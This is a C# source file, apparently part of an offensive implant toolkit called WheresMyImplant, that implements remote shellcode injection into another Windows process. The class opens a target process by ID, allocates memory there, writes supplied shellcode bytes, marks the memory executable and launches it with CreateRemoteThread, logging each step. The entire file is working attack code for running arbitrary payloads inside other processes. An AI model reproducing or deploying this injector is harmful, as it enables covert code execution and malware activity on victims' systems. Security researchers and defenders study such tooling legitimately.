using System;
using System.Runtime.InteropServices;

using Unmanaged.Headers;
using Unmanaged.Libraries;

namespace WheresMyImplant
{
    internal class InjectShellCodeRemote : Base, IDisposable
    {
        private IntPtr hProcess;
        private IntPtr hThread;
        private String shellCodeString;
        private UInt32 processId;

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal InjectShellCodeRemote(String shellCodeString, UInt32 processId)
        {
            this.shellCodeString = shellCodeString;
            this.processId = processId;
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void Execute()
        {
            const Char DELIMITER = ',';
            String[] shellCodeArray = shellCodeString.Split(DELIMITER);
            Byte[] shellCodeBytes = new Byte[shellCodeArray.Length];

            for (Int32 i = 0; i < shellCodeArray.Length; i++)
            {
                Int32 value = (Int32)new System.ComponentModel.Int32Converter().ConvertFromString(shellCodeArray[i]);
                shellCodeBytes[i] = Convert.ToByte(value);
            }

            ////////////////////////////////////////////////////////////////////////////////
            WriteOutputNeutral(String.Format("Attempting to get handle on {0}", processId));
            hProcess = kernel32.OpenProcess(kernel32.PROCESS_CREATE_THREAD | kernel32.PROCESS_QUERY_INFORMATION | kernel32.PROCESS_VM_OPERATION | kernel32.PROCESS_VM_WRITE | kernel32.PROCESS_VM_READ, false, processId);
            if (IntPtr.Zero == hProcess)
            {
                WriteOutputBad("Unable to open process");
                return;
            }
            WriteOutputGood(String.Format("Handle: {0}", hProcess.ToString("X4")));

            ////////////////////////////////////////////////////////////////////////////////
            IntPtr lpAddress = IntPtr.Zero;
            UInt32 dwSize = (UInt32)shellCodeBytes.Length;
            WriteOutputNeutral("Attempting to allocate memory");
            IntPtr lpBaseAddress = kernel32.VirtualAllocEx(hProcess, lpAddress, dwSize, kernel32.MEM_COMMIT, Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_READWRITE);
            if (IntPtr.Zero == lpBaseAddress)
            {
                WriteOutputBad("Unable to allocate memory");
                return;
            }
            WriteOutputGood(String.Format("Allocated {0} bytes at 0x{1}", dwSize, lpBaseAddress.ToString("X4")));
            WriteOutputGood("Memory Protection Set to PAGE_READWRITE");  

            ////////////////////////////////////////////////////////////////////////////////
            UInt32 lpNumberOfBytesWritten = 0;
            GCHandle pinnedArray = GCHandle.Alloc(shellCodeBytes, GCHandleType.Pinned);
            IntPtr shellCodeBytesPtr = pinnedArray.AddrOfPinnedObject();
            WriteOutputNeutral("Attempting to write process memory");
            if (!kernel32.WriteProcessMemory(hProcess, lpBaseAddress, shellCodeBytesPtr, (UInt32)shellCodeBytes.Length, ref lpNumberOfBytesWritten))
            {
                WriteOutputBad("WriteProcessMemory Failed");
                return;
            }
            WriteOutputGood(String.Format("Wrote {0} bytes", lpNumberOfBytesWritten));

            ////////////////////////////////////////////////////////////////////////////////
            Winnt.MEMORY_PROTECTION_CONSTANTS lpflOldProtect = Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_NOACCESS;
            WriteOutputNeutral("Attempting to Alter Memory Protections to PAGE_EXECUTE_READ");
            if (!kernel32.VirtualProtectEx(hProcess, lpBaseAddress, dwSize, Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_EXECUTE_READ, ref lpflOldProtect))
            {
                WriteOutputBad("VirtualProtectEx Failed");
                return;
            }
            WriteOutputGood("Set Memory Protection to PAGE_EXECUTE_READ");

            ////////////////////////////////////////////////////////////////////////////////
            IntPtr lpThreadAttributes = IntPtr.Zero;
            UInt32 dwStackSize = 0;
            IntPtr lpParameter = IntPtr.Zero;
            UInt32 dwCreationFlags = 0;
            UInt32 threadId = 0;
            WriteOutputNeutral("Attempting to start remote thread");
            hThread = kernel32.CreateRemoteThread(hProcess, lpThreadAttributes, dwStackSize, lpBaseAddress, lpParameter, dwCreationFlags, ref threadId);
            if (IntPtr.Zero == hThread)
            {
                WriteOutputBad("CreateRemoteThread Failed");
                return;
            }

            WriteOutputGood(String.Format("Started Thread: {0}", hThread));
            
            ////////////////////////////////////////////////////////////////////////////////
            kernel32.WaitForSingleObjectEx(hProcess, hThread, 0xFFFFFFFF);
        }

        ///////////////////////////////////////////////////////////////////////////////
        //
        ///////////////////////////////////////////////////////////////////////////////
        ~InjectShellCodeRemote()
        {
            Dispose();
        }

        ///////////////////////////////////////////////////////////////////////////////
        //
        ///////////////////////////////////////////////////////////////////////////////
        public void Dispose()
        {
            if (IntPtr.Zero != hProcess)
            {
                kernel32.CloseHandle(hProcess);
            }

            if (IntPtr.Zero != hThread)
            {
                kernel32.CloseHandle(hThread);
            }
        }
    }
}